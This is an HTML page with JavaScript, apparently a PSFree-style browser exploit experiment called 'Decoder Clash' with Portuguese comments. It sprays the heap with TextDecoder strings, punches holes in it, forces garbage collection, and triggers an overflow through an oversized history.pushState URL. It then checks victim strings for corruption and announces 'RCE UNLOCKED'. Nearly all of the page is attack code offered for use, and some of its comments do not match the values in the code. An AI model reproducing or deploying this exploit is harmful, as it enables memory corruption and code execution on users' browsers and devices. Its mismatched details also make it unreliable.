<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: Decoder Clash</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; margin-top: 20px;}
        input { font-size: 30px; padding: 10px; width: 300px; text-align: center; background: #111; color: #fff; border: 2px solid #0f0; margin-top: 10px;}
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #ff0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
        .hit { color: #fff; background-color: #005500; font-weight: bold; padding: 5px; }
    </style>
</head>
<body>

    <h1>Técnica Final: Decoder Clash (Original)</h1>
    <p>Script exato do sucesso. Use o campo abaixo para ajustar o offset.</p>

    <div style="text-align:center">
        OFFSET DO TIRO:<br>
        <input type="number" id="offsetInput" value="709520">
    </div>

    <button onclick="startDecoderAttack()">INICIAR TESTE</button>
    
    <div id="log">Pronto. Reinicie o console antes de cada teste.</div>

    <script>
        // CONFIGURAÇÃO 100% ORIGINAL (Não alterada)
        const OVERFLOW_AMT = 1024 * 64; 

        // ALINHAMENTO DE CLASSE DE TAMANHO (1MB)
        const TARGET_SIZE = 16 * 16; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startDecoderAttack() {
            // Pega o valor do input (Originalmente era constante BASE_OFFSET = 709520)
            let currentOffset = parseInt(document.getElementById('offsetInput').value);

            log(`----------------------------------------`);
            log(`INICIANDO COM OFFSET: ${currentOffset}`);
            log(`Criando vítimas de 1MB usando TextDecoder...`);

            // 1. Preparar o Buffer de origem
            // Enchemos de 'B' (0x42)
            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
            rawBuffer.fill(0x42); 
            
            // TextDecoder força a criação de uma string Flat de 8 bits
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            // 2. SPRAY (Encher o Large Heap)
            // Quantidade original: 80
            const SPRAY_COUNT = 80; 
            
            victims = [];
            for(let i=0; i<SPRAY_COUNT; i++) {
                // Adiciona um prefixo único
                let s = i + "_" + baseString.substring((i+"_").length);
                victims.push(s);
            }

            // 3. BURACOS (Feng Shui)
            log("Abrindo buracos no Large Heap...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null;
            }

            // Força GC pesado (Lógica Original)
            await forceGC();

            // 4. EXPLOIT
            log("Disparando Overflow...");
            setTimeout(() => {
                try {
                    // Aqui usamos o valor do Input
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "pwn", "/" + buffer);

                    log("Verificando corrupção...");
                    checkVictims(PAYLOAD_SIZE, currentOffset);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkVictims(expectedLen, off) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // TRUQUE DO PSFREE: Usar Error para ler
                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // Checa Tamanho (O Objetivo)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT (LENGTH) !!! String ${i}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED NO OFFSET ${off}!`);
                        success = true;
                        break;
                    }

                    // Checa Conteúdo (O Sucesso Anterior)
                    if (msg.charCodeAt(0) !== 66) { // 66 = 'B'
                        log(`[Sucesso Parcial] CONTENT CORRUPTED no Index ${i}`, 'hit');
                        log(`Offset ${off} acertou os DADOS. Tente baixar o número.`, 'hit');
                        success = true;
                        break;
                    }
                } catch(e) {
                    // Se der erro ao ler, pode ser um bom sinal (ponteiro inválido)
                    log(`Erro ao ler vítima ${i}: ${e.message}`);
                }
            }
            if(!success) log("Nenhuma string atingida.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>

